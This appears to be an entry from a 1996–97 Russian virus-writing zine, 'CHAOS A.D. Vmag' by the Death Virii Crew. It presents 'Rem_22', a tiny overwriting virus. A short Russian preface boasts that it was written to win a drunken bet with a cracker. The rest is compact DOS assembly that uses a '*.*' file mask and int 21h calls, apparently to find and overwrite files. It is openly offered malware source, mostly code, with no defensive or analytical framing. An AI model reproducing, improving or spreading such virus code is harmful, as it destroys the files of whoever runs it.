comment {

[Death Virii Crew] Presents
CHAOS A.D. Vmag, Issue 3, Autumn 1996 - Winter 1997


				Rem_22

 Сей маленький оверврайтер был написан под пагубным влиянием пьяных 
споров с известным крекером и хакером SkullC0DEr'ом. Спор был выигран
мной, как достойным представителем своего увлечения - вирмейкерства.
Вот перед вами и есть решение небольшой проблемы, каковая стояла:

{
.model tiny
.code
.startup
start:
pop cx
hel:
xchg ax,bx
db 108h shr 1
db 4eh	; dec si
db 9eh 	shr 1
db 3ch	;cmp al,xx
db 100h shr 1
db 40h
fmask db '*.*',0
lodsw
cwd
mov dl,al
shl dx,1
int 21h
jmp hel
end


						(c) by Reminder [DVC]
